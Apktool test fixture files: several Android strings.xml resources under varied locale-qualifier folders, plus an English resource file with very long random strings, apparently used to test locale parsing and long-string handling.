`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-b+ast+Latn+IT+AREVELA/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-b+en+Latn+419/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-b+en+Latn+US/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-b+en+US+POSIX/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-b+eng+419/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-en-rUS/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-en/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="long_string1">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</string>
    <string name="long_string2">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</string>
    <string name="long_string3">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</string>
    <string name="long_string4">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